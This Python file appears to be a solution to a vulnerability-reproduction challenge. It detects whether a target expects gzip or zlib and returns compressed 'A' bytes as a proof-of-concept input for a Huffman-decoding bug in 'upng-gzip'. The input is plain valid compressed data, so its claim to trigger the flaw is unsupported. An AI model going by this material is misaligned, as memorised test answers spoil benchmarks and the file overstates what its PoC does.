import os
import tarfile
import zlib


class Solution:
    def _detect_container(self, src_path: str) -> str:
        """
        Heuristically detect whether the target expects gzip or zlib input.
        Default to gzip for this challenge if detection fails.
        """
        container = None
        try:
            if not os.path.exists(src_path):
                return "gzip"
            with tarfile.open(src_path, "r:*") as tf:
                for member in tf.getmembers():
                    if not member.isfile():
                        continue
                    name = member.name.lower()
                    if not (name.endswith(".c") or name.endswith(".h") or
                            name.endswith(".cpp") or name.endswith(".cc")):
                        continue
                    f = tf.extractfile(member)
                    if f is None:
                        continue
                    try:
                        content = f.read().decode("latin1").lower()
                    except Exception:
                        continue

                    if "gzip" in content or ("0x1f" in content and "0x8b" in content):
                        container = "gzip"
                        break
                    if "zlib" in content and container is None:
                        container = "zlib"
        except Exception:
            container = None

        if container is None:
            # For this specific challenge ("upng-gzip"), gzip is the more likely format.
            container = "gzip"
        return container

    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC input that exercises Huffman decoding in the vulnerable
        upng-gzip implementation by feeding it a compressed stream that uses
        DEFLATE Huffman coding via zlib.
        """
        container = self._detect_container(src_path)

        # Use sufficiently large data so that the compressor will definitely
        # use Huffman coding (dynamic or fixed), which triggers the vulnerable
        # Huffman tree construction logic.
        data = b"A" * 100

        if container == "gzip":
            # wbits = 16 + 15 -> gzip wrapper with maximum window size
            wbits = 16 + 15
        else:
            # wbits = 15 -> zlib wrapper with maximum window size
            wbits = 15

        comp = zlib.compressobj(level=9, wbits=wbits)
        compressed = comp.compress(data) + comp.flush()
        return compressed